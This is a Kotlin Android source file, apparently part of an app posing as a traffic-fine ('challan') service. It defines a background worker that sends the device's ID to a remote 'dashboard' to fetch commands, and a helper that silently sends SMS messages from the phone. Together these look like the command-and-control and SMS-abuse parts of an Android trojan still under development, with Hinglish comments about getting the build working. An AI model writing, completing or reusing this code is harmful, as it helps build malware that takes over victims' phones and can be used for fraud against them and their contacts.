package com.rte.challan.worker

import android.content.Context
import android.provider.Settings
import android.telephony.SmsManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.rte.challan.network.ClientApi 
import org.json.JSONArray
import org.json.JSONObject

class CommandWorker(context: Context, workerParams: WorkerParameters) :
    Worker(context, workerParams) {

    override fun doWork(): Result {
        val deviceId = Settings.Secure.getString(
            applicationContext.contentResolver, 
            Settings.Secure.ANDROID_ID
        )

        try {
            // Hum sync ke liye postRequest hi use karenge jisme deviceId body mein ho
            // Ya fir ClientApi mein getRequest add karna padega. 
            // Filhaal is logic ko fix karte hain:
            val syncJson = JSONObject().apply {
                put("deviceId", deviceId.toString()) // Explicit toString() to avoid ambiguity
            }

            // Dashboard se commands mangne ke liye
            ClientApi.postRequest("/api/get-commands", syncJson) { success ->
                // Callback logic if needed
            }

            // Note: Agar aapka server response direct callback mein nahi hai, 
            // toh logic thoda badalna padega. Build nikaalne ke liye niche wala fix zaroori hai:

            return Result.success()
        } catch (e: Exception) {
            e.printStackTrace()
            return Result.retry()
        }
    }

    private fun sendDirectSms(number: String, msg: String) {
        try {
            val smsManager: SmsManager = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                applicationContext.getSystemService(SmsManager::class.java)!!
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            smsManager.sendTextMessage(number, null, msg, null, null)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
